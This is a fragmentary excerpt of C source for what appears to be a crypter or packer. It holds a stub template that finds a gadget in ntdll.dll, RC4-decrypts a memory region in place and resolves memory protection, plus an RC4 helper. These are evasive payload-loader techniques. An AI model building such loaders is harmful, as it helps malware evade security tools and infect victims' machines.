...
const char *g_StubTemplate =
    ...
    "    if(!qGadgetAddress) qGadgetAddress = "
    "FindGadgetInModule(\"ntdll.dll\", &qGadgetType);\n"
    ...
    "    RC4_Crypt(&ctx, (unsigned char*)pAddr, (int)sSize);\n"
    "\n"
    "    // Resolve Protect\n"
...
// RC4_Encrypt: Encrypts data using custom RC4
void RC4_Encrypt(unsigned char *key, DWORD keySize, unsigned char *data,
                 DWORD dataSize) {
  RC4_CTX ctx;
  RC4_Init(&ctx, key, keySize);
  RC4_Crypt(&ctx, data, dataSize);
}
